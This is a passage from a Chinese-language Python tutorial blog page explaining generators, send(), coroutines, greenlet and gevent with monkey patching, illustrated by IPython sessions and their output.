class="number">40</span>]: <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   ....:     <span class="keyword">try</span>:</span><br><span class="line">   ....:         x = next(g)</span><br><span class="line">   ....:         print(<span class="string">"value:%d"</span>%x)      </span><br><span class="line">   ....:     <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">   ....:         print(<span class="string">"生成器返回值:%s"</span>%e.value)</span><br><span class="line">   ....:         <span class="keyword">break</span></span><br><span class="line">   ....:     </span><br><span class="line">value:<span class="number">1</span></span><br><span class="line">value:<span class="number">1</span></span><br><span class="line">value:<span class="number">2</span></span><br><span class="line">value:<span class="number">3</span></span><br><span class="line">value:<span class="number">5</span></span><br><span class="line">生成器返回值:done</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]:</span><br></pre></td></tr></table></figure><p>总结</p><ul><li>使用了yield关键字的函数不再是函数，而是生成器。（使用了yield的函数就是生成器）</li><li>yield关键字有两点作用：<ul><li>保存当前运行状态（断点），然后暂停执行，即将生成器（函数）挂起</li><li>将yield关键字后面表达式的值作为返回值返回，此时可以理解为起到了return的作用</li></ul></li><li>可以使用next()函数让生成器从断点处继续执行，即唤醒生成器（函数）</li><li>Python3中的生成器可以使用return返回最终运行的返回值，而Python2中的生成器不允许使用return返回一个返回值（即可以使用return从生成器中退出，但return后不能有任何表达式）。</li></ul><h2 id="4-使用send唤醒"><a href="#4-使用send唤醒" class="headerlink" title="4. 使用send唤醒"></a>4. 使用send唤醒</h2><p>我们除了可以使用next()函数来唤醒生成器继续执行外，还可以使用send()函数来唤醒执行。使用send()函数的一个好处是可以在唤醒的同时向断点处传入一个附加数据。</p><p>例子：执行到yield时，gen函数作用暂时保存，返回i的值; temp接收下次c.send(“python”)，send发送过来的值，c.next()等价c.send(None)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">10</span>]: <span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">()</span>:</span></span><br><span class="line">   ....:     i = <span class="number">0</span></span><br><span class="line">   ....:     <span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line">   ....:         temp = <span class="keyword">yield</span> i</span><br><span class="line">   ....:         print(temp)</span><br><span class="line">   ....:         i+=<span class="number">1</span></span><br><span class="line">   ....:</span><br></pre></td></tr></table></figure><h4 id="使用send"><a href="#使用send" class="headerlink" title="使用send"></a>使用send</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: f = gen()</span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: next(f)</span><br><span class="line">Out[<span class="number">44</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">45</span>]: f.send(<span class="string">'haha'</span>)</span><br><span class="line">haha</span><br><span class="line">Out[<span class="number">45</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">46</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">46</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">47</span>]: f.send(<span class="string">'haha'</span>)</span><br><span class="line">haha</span><br><span class="line">Out[<span class="number">47</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">48</span>]:</span><br></pre></td></tr></table></figure><h4 id="使用next函数"><a href="#使用next函数" class="headerlink" title="使用next函数"></a>使用next函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">11</span>]: f = gen()</span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: next(f)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">13</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">13</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">14</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">15</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">15</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">16</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">16</span>]: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: next(f)</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-17</span><span class="number">-468</span>f0afdf1b9&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 next(f)</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><h4 id="使用-next-方法（不常使用）"><a href="#使用-next-方法（不常使用）" class="headerlink" title="使用__next__()方法（不常使用）"></a>使用<code>__next__()</code>方法（不常使用）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: f = gen()</span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: f.__next__()</span><br><span class="line">Out[<span class="number">19</span>]: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: f.__next__()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">20</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: f.__next__()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">21</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: f.__next__()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">22</span>]: <span class="number">3</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: f.__next__()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">Out[<span class="number">23</span>]: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: f.__next__()</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">StopIteration                             Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-24</span><span class="number">-39</span>ec527346a9&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 f.__next__()</span><br><span class="line"></span><br><span class="line">StopIteration:</span><br></pre></td></tr></table></figure><h1 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h1><p>协程，又称微线程，纤程。英文名Coroutine。</p><h2 id="1-协程是啥"><a href="#1-协程是啥" class="headerlink" title="1.协程是啥"></a>1.协程是啥</h2><p>协程是python个中另外一种实现多任务的方式，只不过比线程更小占用更小执行单元（理解为需要的资源）。 为啥说它是一个执行单元，因为它自带CPU上下文。这样只要在合适的时机， 我们可以把一个协程 切换到另一个协程。 只要这个过程中保存或恢复 CPU上下文那么程序还是可以运行的。</p><p>通俗的理解：在一个线程中的某个函数，可以在任何地方保存当前函数的一些临时变量等信息，然后切换到另外一个函数中执行，注意不是通过调用函数的方式做到的，并且切换的次数以及什么时候再切换到原来的函数都由开发者自己确定</p><h2 id="2-协程和线程差异"><a href="#2-协程和线程差异" class="headerlink" title="2.协程和线程差异"></a>2.协程和线程差异</h2><p>在实现多任务时, 线程切换从系统层面远不止保存和恢复 CPU上下文这么简单。 操作系统为了程序运行的高效性每个线程都有自己缓存Cache等等数据，操作系统还会帮你做这些数据的恢复操作。 所以线程的切换非常耗性能。但是协程的切换只是单纯的操作CPU的上下文，所以一秒钟切换个上百万次系统都抗的住。</p><h2 id="3-简单实现协程"><a href="#3-简单实现协程" class="headerlink" title="3.简单实现协程"></a>3.简单实现协程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"----work1---"</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"----work2---"</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    w1 = work1()</span><br><span class="line">    w2 = work2()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        next(w1)</span><br><span class="line">        next(w2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">----work1---</span><br><span class="line">----work2---</span><br><span class="line">...省略...</span><br></pre></td></tr></table></figure><h1 id="greenlet"><a href="#greenlet" class="headerlink" title="greenlet"></a>greenlet</h1><p>为了更好使用协程来完成多任务，python中的greenlet模块对其封装，从而使得切换任务变的更加简单</p><p>安装方式</p><p>使用如下命令安装greenlet模块:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install greenlet</span><br><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">from greenlet import greenlet</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def test1():</span><br><span class="line">    while True:</span><br><span class="line">        print &quot;---A--&quot;</span><br><span class="line">        gr2.switch()</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">def test2():</span><br><span class="line">    while True:</span><br><span class="line">        print &quot;---B--&quot;</span><br><span class="line">        gr1.switch()</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">gr1 = greenlet(test1)</span><br><span class="line">gr2 = greenlet(test2)</span><br><span class="line"></span><br><span class="line">#切换到gr1中运行</span><br><span class="line">gr1.switch()</span><br></pre></td></tr></table></figure><p>运行效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---A--</span><br><span class="line">---B--</span><br><span class="line">---A--</span><br><span class="line">---B--</span><br><span class="line">---A--</span><br><span class="line">---B--</span><br><span class="line">---A--</span><br><span class="line">---B--</span><br><span class="line">...省略...</span><br></pre></td></tr></table></figure><h1 id="gevent"><a href="#gevent" class="headerlink" title="gevent"></a>gevent</h1><p>greenlet已经实现了协程，但是这个还的人工切换，是不是觉得太麻烦了，不要捉急，python还有一个比greenlet更强大的并且能够自动切换任务的模块<code>gevent</code></p><p>其原理是当一个greenlet遇到IO(指的是input output 输入输出，比如网络、文件操作等)操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。</p><p>由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO</p><p>安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install gevent</span><br></pre></td></tr></table></figure><h2 id="1-gevent的使用"><a href="#1-gevent的使用" class="headerlink" title="1. gevent的使用"></a>1. gevent的使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;Greenlet at <span class="number">0x10e49f550</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f550</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f550</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f550</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f550</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f910</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f910</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f910</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f910</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f910</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f4b0</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f4b0</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f4b0</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f4b0</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x10e49f4b0</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure><p>可以看到，3个greenlet是依次运行而不是交替运行</p><h2 id="2-gevent切换执行"><a href="#2-gevent切换执行" class="headerlink" title="2. gevent切换执行"></a>2. gevent切换执行</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line">        <span class="comment">#用来模拟一个耗时操作，注意不是time模块中的sleep</span></span><br><span class="line">        gevent.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f, <span class="number">5</span>)</span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1c30</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1870</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1eb0</span>: f(<span class="number">5</span>)&gt; <span class="number">0</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1c30</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1870</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1eb0</span>: f(<span class="number">5</span>)&gt; <span class="number">1</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1c30</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1870</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1eb0</span>: f(<span class="number">5</span>)&gt; <span class="number">2</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1c30</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1870</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1eb0</span>: f(<span class="number">5</span>)&gt; <span class="number">3</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1c30</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1870</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br><span class="line">&lt;Greenlet at <span class="number">0x7fa70ffa1eb0</span>: f(<span class="number">5</span>)&gt; <span class="number">4</span></span><br></pre></td></tr></table></figure><h2 id="3-给程序打补丁"><a href="#3-给程序打补丁" class="headerlink" title="3. 给程序打补丁"></a>3. 给程序打补丁</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine_work</span><span class="params">(coroutine_name)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        print(coroutine_name, i)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(coroutine_work, <span class="string">"work1"</span>),</span><br><span class="line">        gevent.spawn(coroutine_work, <span class="string">"work2"</span>)</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">work1 <span class="number">0</span></span><br><span class="line">work1 <span class="number">1</span></span><br><span class="line">work1 <span class="number">2</span></span><br><span class="line">work1 <span class="number">3</span></span><br><span class="line">work1 <span class="number">4</span></span><br><span class="line">work1 <span class="number">5</span></span><br><span class="line">work1 <span class="number">6</span></span><br><span class="line">work1 <span class="number">7</span></span><br><span class="line">work1 <span class="number">8</span></span><br><span class="line">work1 <span class="number">9</span></span><br><span class="line">work2 <span class="number">0</span></span><br><span class="line">work2 <span class="number">1</span></span><br><span class="line">work2 <span class="number">2</span></span><br><span class="line">work2 <span class="number">3</span></span><br><span class="line">work2 <span class="number">4</span></span><br><span class="line">work2 <span class="number">5</span></span><br><span class="line">work2 <span class="number">6</span></span><br><span class="line">work2 <span class="number">7</span></span><br><span class="line">work2 <span class="number">8</span></span><br><span class="line">work2 <span class="number">9</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from gevent import monkey</span><br><span class="line">import gevent</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 有耗时操作时需要</span><br><span class="line">monkey.patch_all()  # 将程序中用到的耗时操作的代码，换为gevent中自己实现的模块</span><br><span class="line"></span><br><span class="line">def coroutine_work(coroutine_name):</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(coroutine_name, i)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(coroutine_work, &quot;work1&quot;),</span><br><span class="line">        gevent.spawn(coroutine_work, &quot;work2&quot;)</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">work1 <span class="number">0</span></span><br><span class="line">work2 <span class="number">0</span></span><br><span class="line">work1 <span class="number">1</span></span><br><span class="line">work1 <span class="number">2</span></span><br><span class="line">work1 <span class="number">3</span></span><br><span class="line">work2 <span class="number">1</span></span><br><span class="line">work1 <span class="number">4</span></span><br><span class="line">work2 <span class="number">2</span></span><br><span class="line">work1 <span class="number">5</span></span><br><span class="line">work2 <span class="number">3</span></span><br><span class="line">work1 <span class="number">6</span></span><br><span class="line">work1 <span class="number">7</span></span><br><span class="line">work1 <span class="number">8</span></span><br><span class="line">work2 <span class="number">4</span></span><br><span class="line">work2 <span class="number">5</span></span><br><span class="line">work1 <span class="number">9</span></span><br><span class="line">work2 <span class="number">6</span></span><br><span class="line">work2 <span class="number">7</span></span><br><span class="line">work2 <span class="number">8</span></span><br><span class="line">work2 <span class="number">9</span></span><br></pre></td></tr></table></figure><h2 id="进程、线程、协程对比"><a href="#进程、线程、协程对比" class="headerlink" title="进程、线程、协程对比"></a>进程、线程、协程对比</h2><h4 id="1-请仔细理解如下的通俗描述"><a href="#1-请仔细理解如下的通俗描述" class="headerlink" title="1.请仔细理解如下的通俗描述"></a>1.请仔细理解如下的通俗描述</h4><ul><li>有一个老板想要开个工厂进行生产某件商品（例如剪子）</li><li>他需要花一些财力物力制作一条生产线，这个生产线上有很多的器件以及材料这些所有的 为了能够生产剪子而准备的资源称之为：进程</li><li>只有生产线是不能够进行生产的，所以老板的找个工人来进行生产，这个工人能够利用这些材料最终一步步的将剪子做出来，这个来做事情的工人称之为：线程</li><li>这个老板为了提高生产率，想到3种办法：<ol><li>在这条生产线上多招些工人，一起来做剪子，这样效率是成倍増长，即单进程 多线程方式</li><li>老板发现这条生产线上的工人不是越多越好，因为一条生产线的资源以及材料毕竟有限，所以老板又花了些财力物力购置了另外一条生产线，然后再招些工人这样效率又再一步提高了，即多进程 多线程方式</li><li>老板发现，现在已经有了很多条生产线，并且每条生产线上已经有很多工人了（即程序是多进程的，每个进程中又有多个线程），为了再次提高效率，老板想了个损招，规定：如果某个员工在上班时临时没事或者再等待某些条件（比如等待另一个工人生产完谋道工序 之后他才能再次工作） ，那么这个员工就利用这个时间去做其它的事情，那么也就是说：如果一个线程等待某些条件，可以充分利用这个时间去做其它事情，其实这就是：协程方式</li></ol></li></ul><h4 id="2-简单总结"><a href="#2-简单总结" class="headerlink" 